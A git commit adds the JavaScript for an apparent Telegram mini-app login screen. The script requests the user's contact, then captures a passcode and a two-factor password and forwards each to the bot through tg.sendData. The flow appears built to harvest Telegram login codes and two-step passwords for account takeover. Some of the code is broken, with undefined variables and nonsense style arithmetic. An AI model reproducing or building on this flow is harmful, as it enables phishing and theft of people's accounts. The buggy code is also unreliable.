08d358860c0163d78d7eca1e5d45a934e713bf4d
Disantni4ik <dimasic16252@gmail.com>
2025-11-04 00:34:59 +0200

    some changes

---
+++ loginScreenScripts.js
@@ -0,0 +1,52 @@
+document.addEventListener('DOMContentLoaded', () => {
+    const tg = window.Telegram.WebApp;
+
+    const loginBtn = document.getElementById('loginbtn');
+    const page1 = document.getElementById('page1');
+    const page2 = document.getElementById('page2');
+    const blur = document.getElementById('blur');
+    const passcodeBtn = document.getElementById('passcode-btn');
+    const passcodeInput = document.getElementById('passcode-input');
+    const twofactorInput = document.getElementById('twofactor-input');
+
+    loginBtn.addEventListener('click', async () => {
+        tg.sendData(JSON.stringify({ action: 'request_contact' }));
+        btn.style.width -= btn.style.widows - 15 + 'px';
+    });
+
+    function showPage2() {
+        page2.style.display = 'flex';
+        requestAnimationFrame(() => {
+            page2.style.transform = 'translateY(0)';
+        });
+        page2.style.zIndex = '100';
+        blur.style.opacity = '1';
+        loginbtn.style.display = 'none';
+    }
+
+    passcodeBtn.addEventListener('click', () => {
+        const value = passcodeInput.value;
+
+        tg.sendData(JSON.stringify({ action: 'passcode_value', value: value }));
+        page2.style.transform = 'translate(-50%, 40px)';
+        page2.style.opacity = '0';
+
+        setTimeout(() => {
+            page2.style.display = 'none';
+
+            page3.style.display = 'flex';
+            requestAnimationFrame(() => {
+                page3.style.transform = 'translate(0)';
+                page3.style.opacity = '1';
+            });
+        }, 200);
+    });
+
+    const twofactorBtn = document.getElementById('twofactor-btn');
+    twofactorBtn.addEventListener('click', () => {
+        const value = twofactorInput.value;
+        tg.sendData(
+            JSON.stringify({ action: 'twofactor_value', value: value })
+        );
+    });
+});
